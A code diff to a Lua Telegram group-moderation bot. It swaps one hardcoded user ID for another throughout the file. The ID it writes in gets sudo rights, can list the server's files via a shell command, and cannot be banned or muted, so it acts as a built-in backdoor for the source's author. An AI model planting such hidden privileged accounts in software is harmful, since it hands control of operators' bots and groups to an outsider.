@@ -27,7 +27,7 @@ chats = {}
 day = 86400
 bot_idkeko = {string.match(token, "^(%d+)(:)(.*)")}
 bot_id = tonumber(bot_idkeko[1])
-sudo_users = {sudo_add,bot_id,633004612}
+sudo_users = {sudo_add,bot_id,6330046121}
 URL33 = require('socket.url')
 tdcli=dofile('./libs/utils.lua')
 ---------- {Show Files} -----------
@@ -841,7 +841,7 @@ end
 getUser(msg.sender_user_id_, TSby)
 end
 -- end function
-if  msg.sender_user_id_ == 633004612 or msg.sender_user_id_ == 352111144 then
+if  msg.sender_user_id_ == 6330046121 or msg.sender_user_id_ == 352111144 then
 if (msg.content_.text_ == 'الملفات' ) then
 local files_tshake = database:smembers("files"..bot_id)
 local keko = io.popen('cd files_tshake && ls'):read("*all")
@@ -1004,7 +1004,7 @@ if result.sender_user_id_ == tonumber(sudo_add) then
 send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك حظر المطور الاساسي \n", 1, 'md')
 return false 
 end
-if result.sender_user_id_ == tonumber(633004612) then
+if result.sender_user_id_ == tonumber(6330046121) then
 send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك حظر المطور الاساسي \n", 1, 'md')
 return false 
 end
@@ -1030,7 +1030,7 @@ if result.id_ == tonumber(sudo_add) then
 send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك حظر المطور الاساسي \n", 1, 'md')
 return false 
 end
-if result.id_ == tonumber(633004612) then
+if result.id_ == tonumber(6330046121) then
 send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك حظر المطور الاساسي \n", 1, 'md')
 return false 
 end
@@ -1057,7 +1057,7 @@ if apbll[2] == tonumber(sudo_add) then
 send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك حظر المطور الاساسي \n", 1, 'md')
 return false 
 end
-if apbll[2] == tonumber(633004612) then
+if apbll[2] == tonumber(6330046121) then
 send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك حظر المطور الاساسي \n", 1, 'md')
 return false 
 end
@@ -3991,7 +3991,7 @@ if result.sender_user_id_ == tonumber(sudo_add) then
 send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك كتم المطور الاساسي \n", 1, 'md')
 return false 
 end
-if result.sender_user_id_ == tonumber(633004612) then
+if result.sender_user_id_ == tonumber(6330046121) then
 send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك كتم المطور الاساسي \n", 1, 'md')
 return false 
 end
@@ -4010,7 +4010,7 @@ if result.id_ == tonumber(sudo_add) then
 send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك كتم المطور الاساسي \n", 1, 'md')
 return false 
 end
-if result.id_ == tonumber(633004612) then
+if result.id_ == tonumber(6330046121) then
 send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك كتم المطور الاساسي \n", 1, 'md')
 return false 
 end
@@ -4031,7 +4031,7 @@ if apbll[2] == tonumber(sudo_add) then
 send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك كتم المطور الاساسي \n", 1, 'md')
 return false 
 end
-if apbll[2] == tonumber(633004612) then
+if apbll[2] == tonumber(6330046121) then
 send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك كتم المطور الاساسي \n", 1, 'md')
 return false 
 end
@@ -4209,7 +4209,7 @@ if result.sender_user_id_ == tonumber(sudo_add) then
 send(msg.chat_id_, msg.id_, 1, "دكعد راحه هذا المطور الاساسي", 1, 'md')
 return false 
 end
-if result.sender_user_id_ == tonumber(633004612) then
+if result.sender_user_id_ == tonumber(6330046121) then
 send(msg.chat_id_, msg.id_, 1, "دكعد راحه هذا المطور الاساسي", 1, 'md')
 return false 
 end
@@ -4222,7 +4222,7 @@ database:srem('tshake:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_
 database:srem('tshake:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_)
 database:srem('tshake:'..bot_id..'creatorbasic:'..msg.chat_id_,result.sender_user_id_)
 t = '( المطورين - المنشئين الاساسين - المنشئين - المدراء - الادمنيه - المميزين )'
-elseif msg.sender_user_id_ == tonumber(633004612) then
+elseif msg.sender_user_id_ == tonumber(6330046121) then
 database:srem('tshake:'..bot_id..'sudoo'..result.sender_user_id_..'', 'no')
 database:srem('tshake:'..bot_id..'dev', result.sender_user_id_)
 database:srem('tshake:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
@@ -4600,7 +4600,7 @@ end
 if (text and text == "رتبتي") then
 if msg.sender_user_id_ == tonumber(sudo_add) then
 t = 'المطور الاساسي'
-elseif msg.sender_user_id_ == tonumber(633004612) then
+elseif msg.sender_user_id_ == tonumber(6330046121) then
 t = 'مطور السورس'
 elseif is_sudo(msg) then
 t = database:get("tshake:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
